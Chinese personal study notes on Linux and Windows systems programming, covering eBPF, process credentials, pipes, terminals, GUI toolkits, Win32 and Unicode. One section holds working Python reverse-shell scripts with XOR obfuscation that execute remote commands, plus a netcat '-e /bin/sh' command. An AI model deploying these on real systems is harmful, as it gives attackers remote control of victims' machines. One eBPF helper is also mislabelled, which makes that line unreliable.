<li>获取时间<code>bpf_ktime_get_ns()</code>，获取随机数<code>bpf_ktime_get_ns()</code>，计算2的对数<code>bpf_log2l()</code></li>
<li><code>bpf_get_current_XXX</code>: 获取当前进程的信息，也就是我们熟悉的<code>current</code>指向的<code>task_struct</code>中的内容。</li>
<li><code>bpf_override_return</code>: 覆盖函数的返回值，但是这个有很大的限制，因为这是一个危险的操作。</li>
<li><code>bpf_trace_printk()</code>: 顾名思义，但是也有一定限制，因为eBPF字节码的限制，他的参数不能超过3个。</li>
<li><code>BPF_PERF_OUTPUT()</code>和<code>perf_submit_XXX</code>: 创建一个Table，并向他传递数据，可以用于<strong>向用户空间传递数据</strong>。</li>
<li><code>BPF_RINGBUF_OUTPUT()</code>和<code>ringbuf_XXX</code>: 创建一个圆形队列，也可以和用户通信</li>
<li><code>BPF_TABLE()</code>: 创建一些数据结构，这些数据结构有一些写好的方法方便使用。</li>
</ol>
<h3 id="从内核源码中直接编译-bpf-程序"><a class="header" href="#从内核源码中直接编译-bpf-程序">从内核源码中直接编译 BPF 程序</a></h3>
<p>待续</p>
<h3 id="bccpython前端"><a class="header" href="#bccpython前端">BCC+Python前端</a></h3>
<p>单看程序的编写，用这一套组合肯定是非常方便的。也以这个为例，来介绍上面的编写思路如何得到体现。更多的例子，可以在<code>/usr/sbin/xxx-bpfcc</code>中看到。</p>
<pre><code class="language-shell">sudo apt-get install bpfcc-tools linux-headers-$(uname -r)
</code></pre>
<h3 id="llvm"><a class="header" href="#llvm">LLVM</a></h3>
<p>我们一般不会直接通过写字节码的方式，而是让编译器将我们的代码翻译成eBPF字节码。LLVM支持了eBPF作的后端，所以我们就可以将C/Rust/Go等语言编译为eBPF字节码。</p>
<p>但是光有字节码是不够的。</p>
<p>参考链接</p>
<ul>
<li><a href="https://www.collabora.com/news-and-blog/blog/2019/04/05/an-ebpf-overview-part-1-introduction/">介绍eBPF基本原理</a></li>
<li><a href="https://www.brendangregg.com/index.html">一个大神的博客，Brendan Gregg's Homepage</a></li>
<li><a href="https://www.brendangregg.com/Slides/Velocity2017_BPF_superpowers.pdf">文中图片的来源，大神的Pre PPT</a></li>
<li>https://blogs.oracle.com/linux/post/bpf-in-depth-communicating-with-userspace</li>
<li>BCC
<ul>
<li><a href="https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md">BCC Python Guide</a></li>
<li><a href="https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md#bpf-c">BCC Reference</a></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="进程"><a class="header" href="#进程">进程</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="信号"><a class="header" href="#信号">信号</a></h1>
<p>信号是进程间通信的一种简单的方式。但是显然，你要为你的多进程应用做进程通信你肯定不会使用信号来做的。发往进程的诸多信号，通常都是源于内核。引发内核为进程产生信号的各类事件如下。</p>
<ul>
<li>硬件发生异常，即硬件检测到一个错误条件并通知内核，随即再由内核发送相应信号给相关进程。硬件异常的例子包括执行一条异常的机器语言指令，诸如，被 0 除，或者引用了无法访问的内存区域。</li>
<li>用户键入了能够产生信号的终端特殊字符。其中包括中断字符（通常是 Control-C)、暂停字符（通常是 Control-Z）。</li>
<li>发生了软件事件。例如，针对文件描述符的输出变为有效，调整了终端窗口大小，定时器到期，进程执行的 CPU 时间超限，或者该进程的某个子进程退出。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="credential-凭证"><a class="header" href="#credential-凭证">Credential 凭证</a></h1>
<p>每个进程都有一套用数字表示的用户 ID（UID）和组 ID(GID)。有时，也将这些 ID 称之为进程凭证。具体如下所示：</p>
<ul>
<li>实际用户 ID（real user ID）和实际组 ID（real group ID）。一般称为uid/gid，或者ruid/rgid</li>
<li>有效用户 ID（effective user ID）和有效组 ID（effective group ID）。一般称为euid/egid</li>
<li>保存的 set-user-ID（saved set-user-ID）和保存的 set-group-ID（saved set-group-ID）。一般称为suid/sgid</li>
<li>文件系统用户 ID（file-system user ID）和文件系统组 ID（file-system group ID）（Linux专有）。一般称为fsuid/fsgid</li>
<li>辅助组 ID。</li>
</ul>
<p>UID 和GID 确定了进程所属的用户和组。</p>
<p>当进程尝试执行各种操作（即系统调用）时，将结合eUID、eGID，连同辅助组ID 一起来确定授予进程的权限。一般来说，eUID/eGID这个概念常和Set-UID/Set-GID同时出现。文件的权限位中有两个特殊位表示Set-UID/Set-GID，当运行带有Set-UID的可执行文件的时候，<em>进程的eUID</em>会被设置为<em>可执行文件的UID</em>；当运行带有Set-GID的可执行文件的时候，<em>进程的eGID</em>会被设置为<em>可执行文件的GID</em>。</p>
<p>在进程开始的时候，sUID/sGID将从eUID/eGID复制而来。他有什么用之后再说。</p>
<p>在 Linux 系统中，要进行诸如打开文件、改变文件属主、修改文件权限之类的文件系统操作时，决定其操作权限的是fsUID 和fsGID（结合辅助组 ID），而非eUID和eGID。他也会受程序的Set-UID/Set-GID位的影响。</p>
<p>如果单看上面的介绍，你会觉得e/s/fs不是一直一模一样？其实，是可以通过一些系统调用对他们进行修改的。</p>
<pre><code class="language-c">#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include &lt;unistd.h&gt;
// 获得ID一般都是成功的，这个函数失败的原因是指针非法
int getresuid(uid_t *ruid, uid_t *euid, uid_t *suid);
int getresgid(gid_t *rgid, gid_t *egid, gid_t *sgid);
// 非特权用户只能将euid设置为ruid/euid/suid
// 非特权用户只能将ruid设置为ruid/euid
// 如果ruid被设置，或者euid被改成和ruid不相等，suid会被改成新的euid
// -1表示不进行设置
// fsuid在设置中会随着euid一起改变
int setreuid(uid_t ruid, uid_t euid);
int setregid(gid_t rgid, gid_t egid);

#include &lt;sys/fsuid.h&gt;
// 不建议设置进程的fsuid
// 非特权用户setfsuid()可以将fsuid设置为rUID,eUID,sUID,或者当前文件系统的UID
int setfsuid(uid_t fsuid);
</code></pre>
<p>所以，感觉suid的作用就如其名。比如原来uid = 1000, euid = suid = 0，现在我们将euid改成1000，因为suid还等于0所以我们有机会再将euid改回0，起到了一个保存的作用。注意第8行注释ruid被设置的意思，设置也可能不变。</p>
<p>顺带一提，0代表root。</p>
<h2 id="in-kernel"><a class="header" href="#in-kernel">in kernel</a></h2>
<p>Kernel中用cred结构体来表示凭证</p>
<pre><code class="language-c">struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key	*session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct ucounts *ucounts;
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	/* RCU deletion */
	union {
		int non_rcu;			/* Can we skip RCU deletion? */
		struct rcu_head	rcu;		/* RCU deletion hook */
	};
} __randomize_layout;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="反向shell和伪终端"><a class="header" href="#反向shell和伪终端">反向Shell和伪终端</a></h1>
<p>参考链接：https://resources.infosecinstitute.com/topic/icmp-reverse-shell/#:~:text=A%20reverse%20shell%20is%20a,Bind%20shell</p>
<p>Shell can simply be described as a piece of code or program which can be used to gain code or command execution on a device .
Shell可以简单的认为是一个可以执行用户命令的程序。</p>
<h2 id="反向shell-demo"><a class="header" href="#反向shell-demo">反向shell demo</a></h2>
<p>这是在攻击者上运行的脚本，一个简陋的shell环境。</p>
<pre><code class="language-python"># 在attack上运行，作为一个服务器发送数据
import socket 

# 创建一个套接字。第一个参数表示使用IPV4，第二个参数表示创建一个TCP socket
# https://docs.python.org/3/library/socket.html#socket.AF_INET
# https://docs.python.org/3/library/socket.html#socket.SOCK_STREAM
# 用with真香，不用close了
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	# 将套接字绑定到 address。套接字必须尚未绑定。0.0.0.0是一个缺省的表述。
	# port应该在1-65535，并且小于1024的需要权限
	s.bind((&quot;0.0.0.0&quot;, 4431))
	# 开启监听，1是连接的最大数量
	s.listen(1)
	print(&quot;Listening on port 4431... &quot;)
	# accept blocks 并等待连接
	# accept返回值为一个connection，以及client的地址。我们通过这个connection和client通信。
	conn, client_addr = s.accept()
	with conn:
		print (&quot; Received connection from : &quot;, client_addr)
		while True:
			command = input('~$ ')
			encode = bytearray(command,encoding=&quot;utf-8&quot;)
			for i in range(len(encode)):
				encode[i] ^=0x41
			conn.sendall(encode)

			en_data=conn.recv(1024)
			decode = bytearray(en_data)
			for i in range(len(decode)):
				decode[i] ^=0x41
			print(decode.decode(&quot;utf-8&quot;))
</code></pre>
<p>这是受害者上运行的脚本。</p>
<pre><code class="language-python">#在victim上运行,作为客户接受数据
import socket,subprocess,sys

RHOST = sys.argv[1]
RPORT = 4431
with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
	s.connect((RHOST,RPORT))
	while True:
		# 从socket中接收XOR编码的数据
		data = s.recv(1024)
		en_data = bytearray(data)
		for i in range(len(en_data)):
			en_data[i] ^= 0x41
		
		# 执行解码命令，subprocess模块能够通过PIPE STDOUT/STDERR/STDIN把值赋值给一个变量
		proc = subprocess.Popen(en_data.decode(&quot;utf-8&quot;), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		try:
			# 等待子进程结束
			proc.wait(timeout=10)
			STDOUT, STDERR = proc.communicate()
		except:
			proc.kill()
			STDOUT = b''
			STDERR = b&quot;[ERROR] Process do not terminate&quot;

		# 输出编码后的数据并且发送给指定的主机RHOST
		en_STDOUT = bytearray(STDOUT+STDERR)
		if not en_STDOUT:
			en_STDOUT = bytearray(b'\n')

		for i in range(len(en_STDOUT)):
			en_STDOUT[i] ^= 0x41
		s.sendall(en_STDOUT)
</code></pre>
<h2 id="伪终端"><a class="header" href="#伪终端">伪终端</a></h2>
<p>上面的反向shell的功能并不是很强大，因为输入输出都是通过管道进行，我们不能执行像vim这样的命令，特殊控制字符（比如<code>Ctrl+C</code>）也不能发送。其实我们只是模拟了一个简易的shell。
伪终端是命令终端(cmd.exe,/bin/sh)通过网络接口反弹给攻击者，或者是新建一个监听端口反弹一个终端给攻击者。（对应于正向和反向）</p>
<pre><code>#启动netcat监听器
~$ nc -lvp 443
listening on [any] 443 ...
 
# 使用netcat反弹'/bin/sh'
~$ nc 127.0.0.1 443 -e /bin/sh

#然后执行命令创建伪终端
python -c &quot;import pty;pty.spawn(&quot;/bin/bash&quot;)&quot;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="性能监控"><a class="header" href="#性能监控">性能监控</a></h1>
<p>Brendan has categorized these tools as follows: <a href="https://www.slideshare.net/brendangregg/velocity-2015-linux-perf-tools/28">Basic</a>, <a href="https://www.slideshare.net/brendangregg/velocity-2015-linux-perf-tools/39">Intermediate</a> and <a href="https://www.slideshare.net/brendangregg/velocity-2015-linux-perf-tools/53">Advanced</a></p>
<p><img src="Advanced/Linux/LinuxProgram//Users/bytedance/Documents/note/Linux/images/1*DhO_BVy9TMDJPYygylU9RA.png" alt="img" /> <sup class="footnote-reference"><a href="#png">1</a></sup></p>
<p><img src="https://www.brendangregg.com/Perf/linux_perf_tools_full.svg" alt="svg" /> <sup class="footnote-reference"><a href="#svg">2</a></sup></p>
<div class="footnote-definition" id="svg"><sup class="footnote-definition-label">2</sup>
<p>https://www.brendangregg.com/Perf/linux_perf_tools_full.svg
<sup class="footnote-reference"><a href="#png">1</a></sup>:  Linux Performance Observability Tools http://www.brendangregg.com/linuxperf.html </p>
</div>
<h2 id="监控工具"><a class="header" href="#监控工具">监控工具</a></h2>
<p>底层工具</p>
<div class="table-wrapper"><table><thead><tr><th>工具名称</th><th>作用</th></tr></thead><tbody>
<tr><td>uptime</td><td>uptime 命令显示的信息显示依次为：现在时间、系统已经运行了多长时间、目前有多少登陆用户、系统在过去的1 分钟、5 分钟和15 分钟内的平均负载。</td></tr>
<tr><td>top</td><td>查看CPU占用情况</td></tr>
<tr><td>vmstat</td><td>查看虚拟内存使用情况</td></tr>
<tr><td>iostat</td><td>查看IO使用情况</td></tr>
<tr><td>mpstat</td><td>查看每个CPU的使用情况，适用多核</td></tr>
<tr><td>free</td><td>内存使用情况</td></tr>
</tbody></table>
</div>
<p>中间层工具</p>
<div class="table-wrapper"><table><thead><tr><th>工具名称</th><th>作用</th></tr></thead><tbody>
<tr><td>strace</td><td>查看系统调用使用情况，但是非常消耗性能</td></tr>
<tr><td>tcpdump</td><td>抓包</td></tr>
<tr><td>netstat</td><td>网络状态</td></tr>
<tr><td>pidstat</td><td>针对某个进程的CPU监控，可取代top</td></tr>
<tr><td>swapon</td><td>查看swap分区的使用情况</td></tr>
<tr><td>sar</td><td>system activity reporter, 可以监控很多情况</td></tr>
<tr><td>collectl</td><td></td></tr>
</tbody></table>
</div>
<p>这都是最基本的工具。。</p>
<p>用ebpf可以自行开发性能检测工具。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="桌面应用开发"><a class="header" href="#桌面应用开发">桌面应用开发</a></h1>
<p>今天突发奇想，搜索了这个问题挺久的。有下面这些解决方案。</p>
<ol>
<li><a href="https://www.gtk.org/docs/">GTK</a>。因为Gnome和xfce都是基于GTK的，所以这个在Linux上会比较<strong>原生</strong>。据说也有跨平台的能力，但是似乎没见过别的平台用这个技术啊。有很多语言的binding。
<ol>
<li>C语言。GTK+就是用C语言写的，发行版中都自带了GTK的库。</li>
<li>Python。<a href="https://pygobject.readthedocs.io/en/latest/">PyGObject库</a>提供了Python使用GTK库的支持。</li>
<li>Rust。<a href="https://gtk-rs.org/">gtk-rs</a>提供了Rust支持。</li>
<li>Vala。这个就比较神奇了，像是带了面向对象的C语言，但不是C++，看起来还挺优美。不过这门语言的应用范围好像仅限于GTK。所以不太推荐，不过我觉得他本身还是值得学习的。</li>
</ol>
</li>
<li>QT。用**C++**开发，难点在于C++，不过QT很强大。Python也有Qt的binding，用Python会简单许多</li>
<li>Electron。这个技术开始流行了，<strong>nodejs</strong>+html+css，可以让我们像开发网站一样开发桌面程序。这个的跨平台能力很强，不过性能肯定是稍弱的，而且打包出来的程序内嵌一个浏览器，体积较大。</li>
</ol>
<p>关于开发之后怎么打包成可执行程序，也有很多解决方案了。比如AppImage。</p>
<h2 id="hello-world-of-gtk"><a class="header" href="#hello-world-of-gtk">Hello world of gtk</a></h2>
<p>首先是安装。我发现我的Ubuntu自带了gtk-3，如果没有的话，参考https://www.gtk.org/docs/installations/linux/。
这是一个C语言GTK3的demo。现在已经升级到GTK4了：</p>
<pre><code class="language-c">#include &lt;gtk/gtk.h&gt;

/* 下面是两个回调函数 */

static void print_hello (GtkWidget *widget,
                         gpointer   data)
{
    g_print (&quot;Hello World\n&quot;);
}

static gboolean on_delete_event (GtkWidget *widget,
                                 GdkEvent  *event,
                                 gpointer   data)
{
    /* If you return FALSE in the &quot;delete_event&quot; signal handler,
     * GTK will emit the &quot;destroy&quot; signal. Returning TRUE means
     * you don't want the window to be destroyed.
     *
     * This is useful for popping up 'are you sure you want to quit?'
     * type dialogs.
     */

    g_print (&quot;delete event occurred\n&quot;);

    return TRUE;
}

int main (int argc, char *argv[])
{
    /* GtkWidget is the storage type for widgets */
    GtkWidget *window;
    GtkWidget *button;

    /* This is called in all GTK applications. Arguments are parsed
     * from the command line and are returned to the application.
     */
    gtk_init (&amp;argc, &amp;argv);

    /* create a new window, and set its title */
    window = gtk_window_new (GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title (GTK_WINDOW (window), &quot;Hello&quot;);

    /* When the window emits the &quot;delete-event&quot; signal (which is emitted
     * by GTK+ in response to an event coming from the window manager,
     * usually as a result of clicking the &quot;close&quot; window control), we
     * ask it to call the on_delete_event() function as defined above.
     *
     * The data passed to the callback function is NULL and is ignored
     * in the callback function.
     */
    g_signal_connect (window, &quot;delete-event&quot;, G_CALLBACK (on_delete_event), NULL);

    /* Here we connect the &quot;destroy&quot; event to the gtk_main_quit() function.
     *
     * This signal is emitted when we call gtk_widget_destroy() on the window,
     * or if we return FALSE in the &quot;delete_event&quot; callback.
     */
    g_signal_connect (window, &quot;destroy&quot;, G_CALLBACK (gtk_main_quit), NULL);

    /* Sets the border width of the window. */
    gtk_container_set_border_width (GTK_CONTAINER (window), 10);

    /* Creates a new button with the label &quot;Hello World&quot;. */
    button = gtk_button_new_with_label (&quot;Hello World&quot;);

    /* When the button receives the &quot;clicked&quot; signal, it will call the
     * function print_hello() passing it NULL as its argument.
     *
     * The print_hello() function is defined above.
     */
    g_signal_connect (button, &quot;clicked&quot;, G_CALLBACK (print_hello), NULL);

    /* The g_signal_connect_swapped() function will connect the &quot;clicked&quot; signal
     * of the button to the gtk_widget_destroy() function; instead of calling it
     * using the button as its argument, it will swap it with the user data
     * argument. This will cause the window to be destroyed by calling
     * gtk_widget_destroy() on the window.
     */
    g_signal_connect_swapped (button, &quot;clicked&quot;, G_CALLBACK (gtk_widget_destroy), window);

    /* This packs the button into the window. A GtkWindow inherits from GtkBin,
     * which is a special container that can only have one child
     */
    gtk_container_add (GTK_CONTAINER (window), button);

    /* The final step is to display this newly created widget... */
    gtk_widget_show (button);

    /* ... and the window */
    gtk_widget_show (window);

    /* All GTK applications must have a gtk_main(). Control ends here
     * and waits for an event to occur (like a key press or a mouse event),
     * until gtk_main_quit() is called.
     */
    gtk_main ();

    return 0;
}
</code></pre>
<p>编译选项：</p>
<pre><code>gcc -o hello-world-gtk hello-world-gtk.c `pkg-config --libs --cflags gtk+-3.0`
</code></pre>
<h2 id="hello_world-of-electron"><a class="header" href="#hello_world-of-electron">Hello_world of Electron</a></h2>
<p>先安装nodejs，setup_16.x可以改成你需要的版本，一般是最新的或者LTS的</p>
<pre><code>curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
sudo apt-get install -y nodejs
</code></pre>
<p>然后</p>
<pre><code># 克隆示例项目的仓库
$ git clone https://github.com/electron/electron-quick-start
# 进入这个仓库
$ cd electron-quick-start
# 安装依赖并运行
$ npm install &amp;&amp; npm start
</code></pre>
<h2 id="hello_world-of-pyqt5"><a class="header" href="#hello_world-of-pyqt5">Hello_world of PyQt5</a></h2>
<pre><code class="language-python"># Filename: hello.py

&quot;&quot;&quot;Simple Hello World example with PyQt5.&quot;&quot;&quot;

import sys

# 1. Import `QApplication` and all the required widgets
from PyQt5.QtWidgets import QApplication
from PyQt5.QtWidgets import QLabel
from PyQt5.QtWidgets import QWidget

# 2. Create an instance of QApplication
app = QApplication(sys.argv)

# 3. Create an instance of your application's GUI
window = QWidget()
window.setWindowTitle('PyQt5 App')
window.setGeometry(100, 100, 280, 80)
window.move(60, 15)
helloMsg = QLabel('&lt;h1&gt;Hello World!&lt;/h1&gt;', parent=window)
helloMsg.move(60, 15)

# 4. Show your application's GUI
window.show()

# 5. Run your application's event loop (or main loop)
sys.exit(app.exec_())
</code></pre>
<hr />
<p>https://makealinux.app/#/</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="管道和重定向"><a class="header" href="#管道和重定向">管道和重定向</a></h1>
<h2 id="引子"><a class="header" href="#引子">引子</a></h2>
<p>我们经常在命令行使用管道和重定向。例如下面这样。具体的语法就不介绍了。</p>
<pre><code class="language-sh">ls -l | grep a.out
a.out &gt; output.txt
a.out 2&gt; error.txt
a.out &lt; input.txt
</code></pre>
<h2 id="系统编程"><a class="header" href="#系统编程">系统编程</a></h2>
<p>如果我们用C语言来实现管道会是什么样子？</p>
<p><code>pipe</code>函数可以用来创建一个单向的管道。<code>pipedes[0]</code>是输入管道的文件描述符，<code>pipedes[1]</code>是输出管道的文件描述符。函数在出错时返回<code>-1</code>，正常返回<code>0</code>。</p>
<pre><code class="language-c">int pipe(int __pipedes[2])
</code></pre>
<p>来看一个例子，通过管道子进程将输出发送到父进程中。</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;unistd.h&gt;
#include &lt;wait.h&gt;

int main() {
    int pipe_fd[2];
    char buffer[256];
    int status;
    memset(buffer, 0, 256);

    if (pipe(pipe_fd) &lt; 0) {
        perror(&quot;pipe&quot;);
        return -1;
    }

    int pid = fork();
    if (pid &lt; 0) {
        perror(&quot;fork&quot;);
    } else if (pid &gt; 0) {
        close(pipe_fd[1]); // 关闭写
        waitpid(pid, &amp;status, 0);
        read(pipe_fd[0], buffer, 256);
        printf(&quot;ls = %s&quot;, buffer);
    } else {
        close(pipe_fd[0]); // 关闭读
        write(pipe_fd[1], &quot;hello world\n&quot;, 13);
    }
    return 0;
}
</code></pre>
<p>那么重定向是怎么实现的呢？很简单，将标准输入/输出替换成管道就好了。将子进程部分代码改成如下内容</p>
<pre><code class="language-c">        close(pipe_fd[0]); // 关闭读
        dup2(pipe_fd[1], STDOUT_FILENO); // 关闭标准输出
        printf(&quot;hello world\n&quot;);
</code></pre>
<p>关键是<a href="https://man7.org/linux/man-pages/man2/dup.2.html"><code>dup2</code></a>，他做了什么呢？他其实做了两件事情</p>
<ol>
<li><code>close(STDOUT_FILENO)</code>，关闭了标准输出。</li>
<li><code>dup(pipe_fd[1])</code>，将<strong>最小可用的文件描述符</strong>，分配为和<code>pipe_fd[1]</code>相同的文件。最小可用的文件描述符是什么？<strong>肯定是之前关掉的那个</strong>（在<code>dup2</code>出现之前，依次调用<code>close</code>和<code>dup</code>，在多线程的情况下可能就不一定了，虽然概率很小）。</li>
</ol>
<h2 id="原理"><a class="header" href="#原理">原理</a></h2>
<p>回顾一下，一个打开的文件，在内核中是一个<code>file</code>结构描述的。对于用户来说，用<code>open</code>打开一个文件，会得到一个文件描述符<code>fd</code>，<code>fd</code>可以认为是<code>file *</code>数组的index，用它来索引一个<code>file</code>。</p>
<p>所谓的标准输入、标准输出、标准错误输出，对应的就是文件描述符<code>0</code>,<code>1</code>,<code>2</code>。我们往标准输出写东西，就是往文件描述符为1的文件写东西。所以，改变<code>1</code>对应的<code>file *</code>就可以了。这还不简单？</p>
<p>在看一下内核对管道的实现，首先想一下，管道就是一种原始的进程间通信的方式。所以可以用<strong>共享内存的方式来实现</strong>。但是，管道是<strong>单向且流式</strong>的——打开的两个文件描述符，一个用来写一个用来读，并且并不支持随机读取。</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="终端"><a class="header" href="#终端">终端</a></h1>
<p>终端程序是有他的标准的。</p>
<p>当执行输入时，驱动程序可以工作在以下两种模式下。</p>
<ul>
<li>规范模式：在这种模式下，终端的输入是按行来处理的，而且可进行行编辑操作。每一行都由换行符来结束，当用户按下回车键时可产生换行符。在终端上执行的 read()调用只会在一行输入完成之后才会返回，且最多只会返回一行。（如果 read()请求的字节数少于当前行中的可用字节，那么剩下的字节在下次 read()调用时可用。）这是默认的输入模式。</li>
<li>非规范模式：终端输入不会被装配成行。像 vi、more 和 less 这样的程序会将终端置于非规范模式，这样不需要用户按下回车键它们就能读取到单个的字符了</li>
</ul>
<p>终端驱动程序会对两个队列做操作：一个用于从终端设备将输入字符传送到读取进程上，另一个用于将输出字符从进程传送到终端上。如果开启了终端回显功能，那么终端驱动程序会自动将任意的输入字符插入到输出队列的尾部，这样输入字符也会成为终端的输出。</p>
<p><img src="Advanced/Linux/LinuxProgram/../images/image-20220511203352574.png" alt="image-20220511203352574" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="进程间通信"><a class="header" href="#进程间通信">进程间通信</a></h1>
<p><img src="Advanced/Linux/LinuxProgram/../images/image-20220711161600467.png" alt="image-20220711161600467" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-programming"><a class="header" href="#windows-programming">Windows Programming</a></h1>
<blockquote>
<p>Win32 is the programming interface (API) for 32-bit and 64-bit Windows operating systems. 他是一个非常具有迷惑性的名字，让人觉得他好像只是32位的编程接口，或许叫做Windows API会更清楚。</p>
</blockquote>
<h2 id="1-错误处理"><a class="header" href="#1-错误处理">1 错误处理</a></h2>
<p><img src="Advanced/Windows/../images/image-20220712164735830.png" alt="image-20220712164735830" /></p>
<p>从函数的返回值我们知道函数是否发生错误，而错误的具体类型则保存在<strong>线程本地存储（每个线程有一个独立的变量存储）<strong>中，这将使线程能够互相独立地运行，而不会影响各自的错误代码。通过<code>DWORD GetLastError()</code>可以获得具体的</strong>错误代码</strong>。<code>WinError.h</code>头文件包含了定义的错误代码的列表。</p>
<p>通过<code>FormatMessage(...)</code>函数可以提供错误的文本描述。</p>
<h2 id="3-内核对象"><a class="header" href="#3-内核对象">3 内核对象</a></h2>
<p>如果说Unix/Linux的哲学是一切皆文件，那么Windows的哲学是一切皆对象。系统要创建和操作若干类型的<strong>内核对象</strong>，比如存取符号对象、事件对象、文件对象、文件映射对象、I / O完成端口对象、作业对象、信箱对象、互斥对象、管道对象、进程对象、信标对象、线程对象和等待计时器对象等。除了内核对象外，你的应用程序也可以使用其他类型的对象，如菜单、窗口、鼠标光标、刷子和字体等。这些对象属于<strong>用户对象</strong>或<strong>图形设备接口（GDI）对象</strong>，而不是内核对象。</p>
<p>就像Linux的<code>open</code>打开文件，<code>close</code>关闭文件。Windows提供了很多很多的<code>HANDLE CreateXXX(...)</code>来创建各种各样对象，返回句柄，通过<code>BOOL CloseHandle(HANDLE hobj)</code>来关闭对象。如果只开不关，那么就会造成泄露，不过操作系统也会在进程终止时兜底的关闭所有对象。</p>
<h3 id="跨越进程边界共享内核对象"><a class="header" href="#跨越进程边界共享内核对象">跨越进程边界共享内核对象</a></h3>
<hr />
<h2 id="关键的dll文件"><a class="header" href="#关键的dll文件">关键的DLL文件</a></h2>
<h2 id="匈牙利命名法"><a class="header" href="#匈牙利命名法">匈牙利命名法</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="unicode"><a class="header" href="#unicode">Unicode</a></h1>
<p>Unicode是字符集，而utf-8是编码方式。字符集是为每个字符分配一个唯一的数字（码位），编码是将码位转化成字符序列。这么说你也许还是感到迷惑，下面举例</p>
<p>比如<code>a,啊</code>，他对应的Unicode码位分别是<code>0x61,0x554a</code>。Unicode的编码空间从U+0000到U+10FFFF，共有1,112,064个<strong>码位（code point）<strong>可用来映射字符。Unicode的编码空间可以划分为17个</strong>平面（plane）</strong>，每个平面包含216（65,536）个码位。17个平面的码位可表示为从U+xx0000到U+xxFFFF，其中xx表示十六进制值从0016到1016，共计17个平面。一般来说，我们只需要用到第一个平面，也就是U+0000~U+FFFF，其他的平面叫做辅助平面。</p>
<p>那么，难道我们要用三个字节来存储每一个Unicode字符吗？或者用两个字节来存储常见的Unicode字符（UCS-2编码方案）？考虑到我们日常使用的很多文本都是ASCII字符，只需要1字节。使用USC-2会造成很大的空间浪费。所以，我们一般使用utf-8编码方式来保存Unicode字符。UTF-8是这样做的：</p>
<ol>
<li>
<p>单字节的字符，字节的第一位设为0，对于英语文本，UTF-8码只占用一个字节，和ASCII码完全相同；</p>
</li>
<li>
<p>n个字节的字符(n&gt;1)，第一个字节的前n位设为1，第n+1位设为0，后面字节的前两位都设为10，这n个字节的其余空位填充该字符unicode码，高位用0补足。</p>
</li>
</ol>
<pre><code>0xxxxxxx
110xxxxx 10xxxxxx
1110xxxx 10xxxxxx 10xxxxxx
11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
</code></pre>
<p>utf-16是USC-2的父集合。如果不考虑辅助平面，那么utf-16和USC-2是一模一样的使用2字节编码。Windows API使用的就是USC-2编码，也就是说他<strong>不处理辅助平面的字符，每一个字符都是2字节</strong>。对于辅助平面的字符，utf-16使用4字节编码，具体的编码方式就不介绍了。</p>
<p>另外，中国还使用GBK来进行编码，他又是另外一种字符集了。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="匈牙利命名法-1"><a class="header" href="#匈牙利命名法-1">匈牙利命名法</a></h1>
<p>Windows使用了匈牙利命名法(Hungarian Notation)，这里不评论他的好坏与否，能做到完全统一的规范那总是好的。哈哈，没有内涵Linux的意思。</p>
<p>在匈牙利命名法中，前缀代表了变量的实际数据类型。所以说匈牙利命名法在一个弱类型的语言中可以帮助使用者判断类型，但是在强类型的语言中又显得冗余。</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Windows Data Type</th><th style="text-align: center">Prefix</th><th style="text-align: center">GNU C说明</th></tr></thead><tbody>
<tr><td style="text-align: center">LPVOID</td><td style="text-align: center">&quot;p&quot;/没有</td><td style="text-align: center">void*</td></tr>
